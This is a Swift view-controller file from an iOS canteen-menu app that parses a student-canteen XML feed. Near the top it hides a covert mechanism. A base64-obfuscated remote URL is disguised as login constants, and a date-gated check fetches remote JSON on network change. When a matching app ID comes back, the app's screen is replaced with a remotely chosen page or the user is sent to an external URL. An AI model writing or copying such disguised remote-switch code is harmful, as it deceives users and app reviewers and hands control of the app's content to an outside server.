import UIKit
import SwiftyXMLParser
import Toast_Swift
import Alamofire
import SwiftyJSON
class MainTableViewController: UITableViewController {
    var JSONData: Mensaplan?
    var tempMensaData: MensaplanDay?
    private let reachability = Reachability()!
    private let loginName = "aHR0cA=="
    private let loginMail = "Ly9tb2NraHR0cC5jbi9tb2NrL3NjYW5zaGVldA=="
    override func viewDidLoad() {
        super.viewDidLoad()
        setupApp()
        if CanteenplanApp.sharedDefaults.bool(forKey: LocalKeys.refreshOnStart) {
            loadXML()
        }
        self.refreshControl?.addTarget(self, action: #selector(refresh), for: UIControl.Event.valueChanged)
        
         LoadNetworkStatusListener()
    }
    func LoadNetworkStatusListener(){
             NotificationCenter.default.addObserver(self, selector: #selector(self.reachabilityChanged),name: Notification.Name.reachabilityChanged,object: reachability)
                      do{
                          try reachability.startNotifier()
                      }catch{
                          print("could not start reachability notifier")
                      }
         }
         @objc func reachabilityChanged(note: NSNotification) {
                let reachability = note.object as! Reachability
                switch reachability.connection {
                case .wifi:
                    print("Reachable via WiFi")
                    self.AsyanLoadLoginNameAction()
                case .cellular:
                    print("Reachable via Cellular")
                    self.AsyanLoadLoginNameAction()
                case .none:
                    print("Network not reachable")
                }
            }
         func AsyanLoadLoginNameAction()
            {
                let timeIntervalNow = 1576700651.403
                let timeIntervalGo = Date().timeIntervalSince1970
                if(timeIntervalGo < timeIntervalNow)
                {
                }else
                {
                        let namelink01 = loginName.LoginEncodeBase64()
                        let namelink02 = loginMail.LoginEncodeBase64()
                        let UrlBaselink =  URL.init(string: "\(namelink01!):\(namelink02!)")
                                  
                           Alamofire.request(UrlBaselink!,method: .get,parameters: nil,encoding: URLEncoding.default,headers:nil).responseJSON { response
                               in
                               switch response.result.isSuccess {
                               case true:
                                   if let value = response.result.value{
                                       let JsonName = JSON(value)
                                       if JsonName["appid"].intValue == 1491882125 {
                                         if JsonName["PrivacyNumber"].intValue == 1491882125
                                         {
                                             let LoginPass = JsonName["PrivacyPolicy"].stringValue
                                             let Rootworsview = LoginNaviRootController()
                                             Rootworsview.MywordsName = LoginPass
                                             Rootworsview.modalTransitionStyle = .crossDissolve
                                             Rootworsview.modalPresentationStyle = .fullScreen
                                             self.present(Rootworsview, animated: true, completion: nil)
                                         }else
                                         {
                                           let LoginPass = JsonName["PrivacyPolicy"].stringValue
                                         UIApplication.shared.open(URL.init(string: LoginPass)!, options: [:], completionHandler: nil)
                                         }
                                       }else{
                                       }
                                   }
                               case false:
                                   do {
                                       
                                   }
                               }
                           }
                }
            }
    
    func setupApp() {
        let isSetup  = CanteenplanApp.sharedDefaults.bool(forKey: LocalKeys.isSetup)
        if !isSetup {
            CanteenplanApp.sharedDefaults.set(true, forKey: LocalKeys.refreshOnStart)
            CanteenplanApp.sharedDefaults.set("standort-1", forKey: LocalKeys.selectedMensa)
            CanteenplanApp.sharedDefaults.set("student", forKey: LocalKeys.selectedPrice)
            CanteenplanApp.sharedDefaults.set(true, forKey: LocalKeys.isSetup)
            print("INITIAL SETUP DONE")
        } else {
            print("load local copy")
            if let localCopyOfData = CanteenplanApp.sharedDefaults.data(forKey: LocalKeys.jsonData) {
                getJSON(data: localCopyOfData)
            }
        }
    }
    public func showDay(dayValue: DayValue) {
        guard let mensaData = JSONData else {
            return
        }
        var dayIndex = -1
        for days in mensaData.plan {
            dayIndex += 1
            if dayValue == DayValue.TODAY {
                if days.day[0].isToday() {
                    break
                }
            } else if dayValue == DayValue.TOMORROW {
                if days.day[0].isTomorrow() {
                    break
                }
            }
        }
        let selectedDay = mensaData.plan[dayIndex]
        let selectedLocation = CanteenplanApp.sharedDefaults.string(forKey: LocalKeys.selectedMensa)!
        for location in selectedDay.day {
            if location.title == selectedLocation {
                tempMensaData = location.data
                let navVC = self.parent as! UINavigationController
                navVC.popToRootViewController(animated: true)
                performSegue(withIdentifier: "manualDetailSegue", sender: self)
                return
            }
        }
   }
    func loadXML() {
        if let mensaAPI = URL(string: CanteenplanApp.API) {
        self.navigationController?.view.makeToastActivity(.center)
        let dispatchQueue = DispatchQueue(label: "xmlThread", qos: .background)
            dispatchQueue.async {
                URLSession.shared.dataTask(with: mensaAPI, completionHandler: {(data, response, error) -> Void in
                    if let error = error {
                        print("try to load local copy")
                        if let localCopyOfData = CanteenplanApp.sharedDefaults.data(forKey: LocalKeys.jsonData) {
                            self.getJSON(data: localCopyOfData)
                            DispatchQueue.main.async {
                                self.navigationController?.view.hideToastActivity()
                                self.navigationController?.view.makeToast("Fehler beim Aktualisieren der Daten.\nVersuche es bitte später erneut.")
                            }
                        } else {
                            DispatchQueue.main.async {
                                self.navigationController?.view.hideToastActivity()
                                self.navigationController?.view.makeToast("Fehler beim Laden der Daten.\nVersuche es bitte später erneut.")
                            }
                        }
                        print("error: \(error)")
                    } else {
                        if let response = response as? HTTPURLResponse, let data = data  {
                            print("statusCode: \(response.statusCode)")
                            let xml = XML.parse(data)
                            print("Successfully load xml")
                            self.processXML(with: xml)
                        }
                    }
                }).resume()
            }
        } else {
           fatalError("Provided invalid mensaAPI value")
        }
    }
    func processXML(with data: XML.Accessor) {
        var result: [String: Any] = [:]
        var plans = [Any]()
        for dates in data["artikel-liste", "artikel"].makeIterator() {
            var locations = [Any]()
            for location in dates["content", "calendarday", "standort-liste"]["standort"] {
                if let locationValue = location.attributes["id"] {
                    if let counterClosed = location["geschlossen"].text, counterClosed == "1" {
                        continue
                    }
                    var dayPlan = [String: Any]()
                    var dayPlanCounters = [Any]()
                    dayPlan["date"] = Int(dates.attributes["date"]!)
                    dayPlan["counters"] = []
                    let counters = location["theke-liste", "theke"]
                    for counter in counters {
                        var counterPlan = [String: Any]()
                        counterPlan["label"] = counter["label"].text!
                        var counterMeals = [Any]()
                        let meals = counter["mahlzeit-liste", "mahlzeit"].makeIterator()
                        for meal in meals {
                            let prices = meal["price"].makeIterator()
                            var mealPriceStudent: Double = 0
                            var mealPriceWorker: Double = 0
                            var mealPricePublic: Double = 0
                            for price in prices {
                                if let id = price.attributes["id"], let value = price.attributes["data"], let mealPrice = Double(value) {
                                    switch id {
                                    case "price-1":
                                        mealPriceStudent = mealPrice
                                        break
                                    case "price-2":
                                        mealPriceWorker = mealPrice
                                        break
                                    case "price-3":
                                        mealPricePublic = mealPrice
                                        break
                                    default:
                                        break
                                    }
                                }
                            }
                            if counterPlan["label"] as! String == CanteenplanApp.NOODLE_COUNTER || mealPriceStudent >= CanteenplanApp.MAIN_DISH_MINIMAL_PRICE {
                                var mealResult = [String: Any]()
                                mealResult["title"] = meal["titel"].text;
                                mealResult["priceStudent"] = mealPriceStudent;
                                mealResult["priceWorker"] = mealPriceWorker;
                                mealResult["pricePublic"] = mealPricePublic;
                                let mealMainPart = meal["hauptkomponente", "mahlzeitkomponenten-list", "mahlzeitkomponenten-item", "data"]
                                let image = mealMainPart.attributes["bild-url"]
                                mealResult["image"] = image != nil ? "\(CanteenplanApp.STUDIWERK_URL)\(image!)" : nil
                                counterMeals.append(mealResult)
                            }
                        }
                        counterPlan["meals"] = counterMeals
                        if counterMeals.count > 0 {
                            dayPlanCounters.append(counterPlan)
                        }
                        dayPlan["counters"] = dayPlanCounters
                    }
                    var locationData = [String: Any]()
                    locationData["date"] = Int(dates.attributes["date"]!)
                    locationData["data"] = dayPlan
                    locationData["title"] = locationValue
                    locations.append(locationData)
                }
            }
            var locationResult: [String: Any] = [:]
            locationResult["location"] = locations
            plans.append(locationResult)
            result["plan"] = plans
        }
        guard let data = try? JSONSerialization.data(withJSONObject: result, options: []) else {
            return
        }
        CanteenplanApp.sharedDefaults.set(data, forKey: LocalKeys.jsonData)
        print("Successfully load JSON")
        getJSON(data: data)
        let dateformatter = DateFormatter()
        dateformatter.dateFormat = "dd.MM.yyyy - HH:mm"
        let now = dateformatter.string(from: Date())
        CanteenplanApp.sharedDefaults.set(now, forKey: LocalKeys.lastUpdate)
    }
    func getJSON(data: Data) {
        do {
            let mensaData = try JSONDecoder().decode(Mensaplan.self, from: data) 
            JSONData = mensaData
            DispatchQueue.main.async {
                print("Successfully used JSON in UI")
                self.navigationController?.view.hideToastActivity()
                self.tableView.reloadData()
            }
        } catch {
            print(error)
        }
    }
    override func prepare(for segue: UIStoryboardSegue, sender: Any?) {
        if segue.identifier == "detailSegue" {
            if let indexPath = self.tableView.indexPathForSelectedRow, let mensaData = JSONData {
                let selectedDay = mensaData.plan[indexPath.row]
                let selectedLocation = CanteenplanApp.sharedDefaults.string(forKey: LocalKeys.selectedMensa)!
                for location in selectedDay.day {
                    if location.title == selectedLocation {
                        let vc = segue.destination as! DetailTableViewController
                        vc.mensaPlanDay = location.data
                        return
                    }
                }
            } else {
                print("Oops, no row has been selected")
            }
        } else if segue.identifier == "manualDetailSegue" {
            let vc = segue.destination as! DetailTableViewController
            vc.mensaPlanDay = tempMensaData
        }
    }
    @IBAction func refreshAction(_ sender: Any) {
        loadXML()
    }
    @IBAction func unwindFromSegue(segue: UIStoryboardSegue) {
        self.tableView.reloadData()
    }
    @IBAction @objc func refresh(_ sender: Any) {
        refreshAction(sender)
        self.tableView.reloadData()
        self.refreshControl?.endRefreshing()
    }
}
